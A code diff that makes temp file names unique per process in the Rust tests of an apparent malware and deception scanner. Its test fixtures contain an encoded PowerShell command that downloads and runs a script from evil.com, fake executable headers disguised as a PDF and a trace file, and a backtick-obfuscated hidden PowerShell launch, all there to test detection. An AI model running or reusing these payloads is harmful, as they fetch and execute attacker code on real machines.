@@ -1434,7 +1434,10 @@ mod tests {
         // "Привет" with a capital П only matches when the haystack is
         // Unicode-lowercased (to_ascii_lowercase leaves Cyrillic untouched).
         let temp_dir = std::env::temp_dir();
-        let file_path = temp_dir.join("test_deceptive_cyrillic.txt");
+        let file_path = temp_dir.join(format!(
+            "test_deceptive_cyrillic_{}.txt",
+            std::process::id()
+        ));
         {
             let mut f = File::create(&file_path).unwrap();
             f.write_all(
@@ -1455,7 +1458,7 @@ mod tests {
     #[test]
     fn test_deceptive_greeting_wrapper_detection() {
         let temp_dir = std::env::temp_dir();
-        let file_path = temp_dir.join("test_deceptive_malware.txt");
+        let file_path = temp_dir.join(format!("test_deceptive_malware_{}.txt", std::process::id()));
         {
             let mut f = File::create(&file_path).unwrap();
             f.write_all("Xin chao ban yeu dau! Chuc mot ngay tot lanh.\n\npowershell -enc aW52b2tlLWV4cHJlc3Npb24gKG5ldy1vYmplY3Qgc3lzdGVtLm5ldC53ZWJjbGllbnQpLmRvd25sb2Fkc3RyaW5nKCJodHRwczovL2V2aWwuY29tL3BheWxvYWQucHMxIik=".as_bytes()).unwrap();
@@ -1476,7 +1479,7 @@ mod tests {
     #[test]
     fn test_disguised_pe_detection() {
         let temp_dir = std::env::temp_dir();
-        let file_path = temp_dir.join("fake_invoice.pdf");
+        let file_path = temp_dir.join(format!("fake_invoice_{}.pdf", std::process::id()));
         {
             let mut f = File::create(&file_path).unwrap();
             f.write_all(b"MZ\x90\x00\x03\x00\x00\x00This program cannot be run in DOS mode.")
@@ -1496,7 +1499,7 @@ mod tests {
     #[test]
     fn test_tmf_analysis_injected_powershell() {
         let temp_dir = std::env::temp_dir();
-        let file_path = temp_dir.join("driver_trace.tmf");
+        let file_path = temp_dir.join(format!("driver_trace_{}.tmf", std::process::id()));
         {
             let mut f = File::create(&file_path).unwrap();
             f.write_all("// PDB: mydriver.pdb\n#typev Driver_c100 10 \"[Trace] %!FUNC!\" // Injected: powershell downloadstring\n".as_bytes()).unwrap();
@@ -1515,7 +1518,7 @@ mod tests {
     #[test]
     fn test_tmf_disguised_executable() {
         let temp_dir = std::env::temp_dir();
-        let file_path = temp_dir.join("fake_trace.tmf");
+        let file_path = temp_dir.join(format!("fake_trace_{}.tmf", std::process::id()));
         {
             let mut f = File::create(&file_path).unwrap();
             f.write_all(b"MZ\x90\x00\x03\x00\x00\x00Fake TMF is actually PE")
@@ -1535,7 +1538,7 @@ mod tests {
     #[test]
     fn test_backtick_obfuscation_detection() {
         let temp_dir = std::env::temp_dir();
-        let file_path = temp_dir.join("test_backtick.ps1");
+        let file_path = temp_dir.join(format!("test_backtick_{}.ps1", std::process::id()));
         {
             let mut f = File::create(&file_path).unwrap();
             f.write_all("Write-Host 'Test'\n& (p`o`w`e`r`s`h`e`l`l) -w hidden\n".as_bytes())
@@ -1554,7 +1557,7 @@ mod tests {
     #[test]
     fn test_zero_width_steganography_payload() {
         let temp_dir = std::env::temp_dir();
-        let file_path = temp_dir.join("test_stego.txt");
+        let file_path = temp_dir.join(format!("test_stego_{}.txt", std::process::id()));
         {
             let mut f = File::create(&file_path).unwrap();
 
@@ -1625,7 +1628,10 @@ mod tests {
         // Regression: documentation quoting shell names with backticks must
         // NOT raise "Backtick Obfuscation Evasion".
         let temp_dir = std::env::temp_dir();
-        let file_path = temp_dir.join("test_benign_backticks_doc.txt");
+        let file_path = temp_dir.join(format!(
+            "test_benign_backticks_doc_{}.txt",
+            std::process::id()
+        ));
         {
             let mut f = File::create(&file_path).unwrap();
             f.write_all(
@@ -1657,7 +1663,7 @@ mod tests {
         // Regression: prose that merely mentions "cmd.exe" next to a caret
         // escape elsewhere must NOT raise "Caret Escape Obfuscation".
         let temp_dir = std::env::temp_dir();
-        let file_path = temp_dir.join("test_benign_caret_doc.txt");
+        let file_path = temp_dir.join(format!("test_benign_caret_doc_{}.txt", std::process::id()));
         {
             let mut f = File::create(&file_path).unwrap();
             f.write_all(
